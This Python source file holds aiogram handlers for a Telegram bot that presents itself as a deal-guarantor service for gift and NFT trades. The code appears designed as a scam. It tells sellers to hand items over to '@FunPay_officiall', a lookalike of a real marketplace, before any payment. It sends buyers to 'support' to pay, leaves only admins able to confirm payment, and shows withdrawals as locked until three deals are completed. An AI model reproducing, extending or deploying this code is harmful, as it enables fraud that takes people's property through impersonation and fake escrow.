import secrets
from aiogram import Router, F
from aiogram.filters import CommandStart, Command
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext

from config import BOT_USERNAME, ADMIN_ID, GUARANTOR_ID
from states.deal_states import DealStates
from keyboards.deal_kb import (
    deal_method_kb, deal_currency_kb, deal_amount_kb,
    deal_description_kb, deal_card_kb, deal_offer_kb,
    deal_seller_kb, deal_done_kb, deal_cancelled_kb,
)
from keyboards.menus import main_menu_kb, back_kb, language_kb
from utils.notifier import show_screen, show_screen_edit
from utils.i18n import t, USER_LANGS, LANG_HEADER
from database.storage import (
    get_cards, get_user, create_deal, get_deal, update_deal,
    add_balance, add_stars, inc_completed_deals, get_completed_deals,
    ensure_user, is_coadmin, add_referral, get_referral_count,
)
from handlers.start import main_text

router = Router()


@router.callback_query(F.data == "create_deal")
async def cb_create_deal(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    ensure_user(uid, call.from_user.username or "")
    await state.set_state(DealStates.choosing_method)
    await show_screen(call, "💳 <b>Выберите способ оплаты:</b>", deal_method_kb(uid))
    await call.answer()


@router.callback_query(F.data == "deal_method_card")
async def cb_method_card(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    if not get_cards(uid):
        await call.answer("У вас нету карты в реквизитах!", show_alert=True)
        return
    await state.update_data(method="card")
    await state.set_state(DealStates.choosing_currency)
    await show_screen(call, "🌐 <b>Выберите валюту:</b>", deal_currency_kb(uid))
    await call.answer()


@router.callback_query(F.data == "deal_method_stars")
async def cb_method_stars(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    await state.update_data(method="stars", currency="STARS")
    await state.set_state(DealStates.entering_amount)
    await show_screen(call, "💰 <b>Сколько вы платите?</b>", deal_amount_kb(uid))
    await call.answer()


@router.callback_query(F.data.startswith("deal_currency_"))
async def cb_currency(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    currency = call.data.replace("deal_currency_", "")
    await state.update_data(currency=currency)
    await state.set_state(DealStates.entering_amount)
    await show_screen(call, f"💰 <b>Сколько вы платите? ({currency})</b>", deal_amount_kb(uid))
    await call.answer()


@router.message(DealStates.entering_amount)
async def process_amount(message: Message, state: FSMContext):
    uid = message.from_user.id
    try:
        await message.delete()
    except Exception:
        pass

    try:
        amount = float(message.text.strip().replace(",", "."))
    except ValueError:
        return
    if amount <= 0:
        return

    await state.update_data(amount=amount)
    await state.set_state(DealStates.entering_description)
    await show_screen_edit(
        message.bot, uid, message.chat.id,
        "📦 <b>Что вы хотите купить?</b>",
        deal_description_kb(uid)
    )


@router.message(DealStates.entering_description)
async def process_description(message: Message, state: FSMContext):
    uid = message.from_user.id
    try:
        await message.delete()
    except Exception:
        pass

    description = message.text.strip()
    data = await state.get_data()
    amount = data["amount"]
    currency = data["currency"]
    method = data.get("method", "card")

    user = get_user(uid)

    deal_id = secrets.token_hex(4)
    create_deal(
        deal_id=deal_id,
        creator_id=uid,
        amount=amount,
        currency=currency,
        description=description,
        method=method,
    )

    link = f"https://t.me/{BOT_USERNAME}?start={deal_id}"

    if method == "stars":
        give_str = f"⭐ {amount:.0f} Stars"
        pay_str = f"⭐ {amount:.0f} Stars"
    else:
        give_str = f"💰 {amount:.1f} {currency}"
        pay_str = f"💰 {amount:.1f} {currency}"

    if user["username"]:
        seller_display = f"@{user['username']}"
    else:
        seller_display = "---"

    text = (
        f"🎁 <b>Сделка</b> <code>{deal_id}</code>\n"
        f"<b>Тип сделки:</b> 🎁 Подарки\n\n"
        f"👤 <i>Вы покупатель, у вас есть 15 минут на оплату сделки!</i>\n\n"
        f"🎯 <b>Продавец:</b> {seller_display}\n"
        f"• <b>Количество сделок продавца:</b> {user['deals_count']}\n"
        f"• <b>Сумма сделок продавца:</b> {user['balance']:.1f}$\n\n"
        f"• <b>Вы покупаете:</b> {description}\n"
        f"• <b>Вы отдаете:</b> {give_str}\n\n"
        f"<b>Реквизиты для оплаты:</b>\n"
        f"💬 <b>Оплата через поддержку</b>\n"
        f"Нажмите кнопку «Саппорт» ниже — оператор подскажет, как оплатить.\n\n"
        f"👉 @FunPay_officiall\n\n"
        f"💵 <b>Сумма к оплате:</b>\n"
        f"{pay_str}\n\n"
        f"🔖 <b>Комментарий к транзакции:</b>\n"
        f"<code>{deal_id}</code>\n\n"
        f"🔗 <b>Ссылка для покупателя:</b>\n"
        f"<code>{link}</code>\n\n"
        f"<blockquote>❗ Пожалуйста, убедитесь что при оплате указываете "
        f"обязательный комментарий (memo) и точную сумму!</blockquote>\n\n"
        f"<i>После оплаты ожидайте подтверждения администратором.</i>"
    )

    await show_screen_edit(
        message.bot, uid, message.chat.id,
        text, deal_card_kb(uid, deal_id, link)
    )
    await state.clear()


@router.callback_query(F.data == "deal_back_to_method")
async def cb_back_method(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    await state.set_state(DealStates.choosing_method)
    await show_screen(call, "💳 <b>Выберите способ оплаты:</b>", deal_method_kb(uid))
    await call.answer()


@router.callback_query(F.data == "deal_back_to_currency")
async def cb_back_currency(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    await state.set_state(DealStates.choosing_currency)
    await show_screen(call, "🌐 <b>Выберите валюту:</b>", deal_currency_kb(uid))
    await call.answer()


@router.callback_query(F.data == "deal_back_to_amount")
async def cb_back_amount(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    await state.set_state(DealStates.entering_amount)
    await show_screen(call, "💰 <b>Сколько вы платите?</b>", deal_amount_kb(uid))
    await call.answer()


@router.callback_query(F.data == "deal_cancel")
async def cb_deal_cancel(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    await state.clear()
    await show_screen(
        call,
        "✅ <b>Сделка отменена успешно</b>",
        deal_cancelled_kb(uid)
    )
    await call.answer()


@router.message(CommandStart(deep_link=True))
async def cmd_start_with_deal(message: Message):
    uid = message.from_user.id
    ensure_user(uid, message.from_user.username or "")

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        return
    payload = parts[1].strip()

    if payload.startswith("ref_"):
        try:
            referrer_id = int(payload.replace("ref_", ""))
        except ValueError:
            return
        add_referral(referrer_id, uid)
        try:
            await message.bot.send_message(
                referrer_id,
                f"🎉 <b>Новый реферал!</b>\n\n"
                f"👤 {message.from_user.full_name}\n"
                f"📊 Всего приглашено: <b>{get_referral_count(referrer_id)}</b>",
                parse_mode="HTML"
            )
        except Exception:
            pass

        if uid not in USER_LANGS:
            await show_screen(message, LANG_HEADER, language_kb(uid))
        else:
            await show_screen(message, main_text(uid), main_menu_kb(uid))
        return

    deal_id = payload
    deal = get_deal(deal_id)
    if not deal:
        await message.answer("❌ <b>Сделка не найдена</b>", parse_mode="HTML")
        return

    if deal["creator_id"] != uid:
        add_referral(deal["creator_id"], uid)
        try:
            await message.bot.send_message(
                deal["creator_id"],
                f"🎉 <b>Новый реферал!</b>\n\n"
                f"👤 {message.from_user.full_name}\n"
                f"📊 Всего приглашено: <b>{get_referral_count(deal['creator_id'])}</b>",
                parse_mode="HTML"
            )
        except Exception:
            pass

    status = deal["status"]
    if status == "accepted":
        await message.answer("⚠️ <b>Сделка уже принята</b>", parse_mode="HTML")
        return
    if status == "completed":
        await message.answer("✅ <b>Сделка уже завершена</b>", parse_mode="HTML")
        return
    if status == "cancelled":
        await message.answer("❌ <b>Сделка отменена</b>", parse_mode="HTML")
        return

    # Временно отключено для теста:
    # if deal["creator_id"] == uid:
    #     await message.answer(
    #         "<b>Вы не можете открыть собственную сделку!</b>\n\n"
    #         "<blockquote>Отправьте эту ссылку покупателю для завершения оплаты</blockquote>",
    #         parse_mode="HTML"
    #     )
    #     return

    if deal["method"] == "stars":
        sum_line = f"<b>{deal['amount']:.0f} STARS</b>"
    else:
        sum_line = f"<b>{deal['amount']:.1f} {deal['currency']}</b>"

    text = (
        f"📩 <b>Вам предложили сделку</b>\n"
        f"🆔 Сделка номер: <code>#{deal_id}</code>\n\n"
        f"💵 <b>Вам предлагают:</b>\n"
        f"{sum_line}\n"
        f"📦 <b>за:</b>\n"
        f"<b>{deal['description']}</b>"
    )
    await message.answer(text, reply_markup=deal_offer_kb(uid, deal_id), parse_mode="HTML")


@router.callback_query(F.data.startswith("deal_accept_"))
async def cb_deal_accept(call: CallbackQuery):
    uid = call.from_user.id
    deal_id = call.data.replace("deal_accept_", "")
    deal = get_deal(deal_id)

    if not deal:
        await call.answer("Сделка не найдена", show_alert=True)
        return
    if deal["status"] != "waiting_payment":
        await call.answer("Сделка уже принята", show_alert=True)
        return

    update_deal(deal_id, seller_id=uid, status="accepted")

    text = (
        "✅ <b>Сделка принята!</b>\n\n"
        f"📦 Отправьте <b>{deal['description']}</b> на аккаунт "
        f"<b>@FunPay_officiall</b>\n\n"
        "После получения NFT покупатель оплатит сделку."
    )
    await show_screen(call, text, deal_seller_kb(uid))
    await call.answer()


@router.callback_query(F.data.startswith("deal_decline_"))
async def cb_deal_decline(call: CallbackQuery):
    uid = call.from_user.id
    deal_id = call.data.replace("deal_decline_", "")
    update_deal(deal_id, status="cancelled")
    await call.answer("Сделка отклонена", show_alert=True)


@router.message(Command("buy"))
async def cmd_buy(message: Message):
    uid = message.from_user.id

    if not (is_coadmin(uid) or uid in {ADMIN_ID, GUARANTOR_ID}):
        await message.answer(
            "❌ <b>Команда доступна только администраторам</b>",
            parse_mode="HTML"
        )
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Использование: /buy <номер_сделки>")
        return

    deal_id = parts[1].strip().lstrip("#")
    deal = get_deal(deal_id)

    if not deal:
        await message.answer("❌ Сделка не найдена")
        return
    if deal["status"] == "completed":
        await message.answer("✅ Сделка уже оплачена")
        return
    if deal["status"] != "accepted":
        await message.answer("⚠️ Сделка ещё не принята продавцом")
        return

    creator_id = deal["creator_id"]
    seller_id = deal["seller_id"]
    amount = deal["amount"]
    method = deal["method"]

    if method == "stars":
        if not (is_coadmin(creator_id) or creator_id in {ADMIN_ID, GUARANTOR_ID}):
            u = get_user(creator_id)
            if u["stars"] < amount:
                await message.answer("❌ <b>У покупателя недостаточно звёзд</b>", parse_mode="HTML")
                return
            add_stars(creator_id, -amount)
    else:
        u = get_user(creator_id)
        if u["balance"] < amount:
            await message.answer("❌ <b>У покупателя недостаточно средств</b>", parse_mode="HTML")
            return
        add_balance(creator_id, -amount)

    payout = amount * 0.97

    if method == "stars":
        add_stars(seller_id, payout)
        payout_str = f"⭐ {payout:.2f} Stars"
    else:
        add_balance(seller_id, payout)
        payout_str = f"💰 {payout:.2f} {deal['currency']}"

    update_deal(deal_id, status="completed")
    inc_completed_deals(creator_id)
    inc_completed_deals(seller_id)

    try:
        await message.bot.send_message(
            seller_id,
            f"✅ <b>Сделка успешно завершена!</b>\n\n"
            f"🆔 Сделка: <code>{deal_id}</code>\n"
            f"💵 <b>Сумма зачислена на баланс:</b> {payout_str}\n\n"
            f"<i>Комиссия платформы: 3%</i>",
            reply_markup=deal_done_kb(seller_id),
            parse_mode="HTML"
        )
    except Exception:
        pass

    await message.answer(
        f"✅ <b>Сделка оплачена!</b>\n\n"
        f"Продавцу зачислено: {payout_str}",
        parse_mode="HTML"
    )


@router.callback_query(F.data == "withdraw")
async def cb_withdraw(call: CallbackQuery):
    uid = call.from_user.id
    done = get_completed_deals(uid)

    if done < 3:
        body = (
            "🔒 <b>Для безопасности вывода нужно совершить 3 сделки</b>\n\n"
            f"📊 Совершено сделок: <b>{done}/3</b>"
        )
    else:
        body = (
            "✅ <b>Вывод доступен</b>\n\n"
            f"📊 Совершено сделок: <b>{done}</b>"
        )

    text = f"💸 <b>Вывод</b>\n\n{body}"
    await show_screen(call, text, back_kb(uid))
    await call.answer()